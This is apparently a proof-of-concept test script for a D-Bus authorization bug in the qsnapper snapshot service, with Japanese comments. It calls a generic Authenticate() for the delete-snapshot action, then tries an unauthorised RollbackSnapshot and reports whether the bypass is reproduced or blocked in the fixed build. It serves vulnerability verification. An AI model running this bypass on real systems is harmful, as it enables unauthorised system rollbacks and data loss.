#!/bin/bash
# poc_action_mixup.sh - Issue #4b: Authenticate() 任意actionId混用
#
# シナリオ:
#   1. Authenticate("com.presire.qsnapper.delete-snapshot") で認証成立
#      → m_authenticated=true
#   2. 続けて RollbackSnapshot を呼ぶ
#      → v1.3.2: 権限不要のままロールバック成立
#   3. 修正版 (P0-2): Authenticate() メソッド自体が削除されており UnknownMethod。
#      個別メソッドは全てPolkit判定でしか通らない。

set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

# Step 1: Authenticate() の存在確認
log "Step 1: probe Authenticate() method existence"
AUTH_OUT=$(dbus-send --system --print-reply --dest="$DBUS_SERVICE" \
    "$DBUS_PATH" "${DBUS_IFACE}.Authenticate" \
    string:"com.presire.qsnapper.delete-snapshot" 2>&1 || true)

if echo "$AUTH_OUT" | grep -qE "UnknownMethod|does not exist"; then
    log "Authenticate() is removed — good for fixed build"
    report_result blocked
fi

# Step 2: Authenticate成功したとして、異アクションの呼び出しを試す
log "Step 2: attempt RollbackSnapshot after bogus Authenticate"
SNAP_ID=$(ensure_snapshot root)
ROLLBACK_OUT=$(dbus-send --system --print-reply --dest="$DBUS_SERVICE" \
    "$DBUS_PATH" "${DBUS_IFACE}.RollbackSnapshot" \
    string:"root" int32:"$SNAP_ID" 2>&1 || true)

if echo "$ROLLBACK_OUT" | grep -qE "Error.*(AccessDenied|NotAuthorized)"; then
    log "RollbackSnapshot properly required its own authentication"
    report_result blocked
else
    log "RollbackSnapshot allowed by mixed-action authentication"
    report_result reproduced
fi
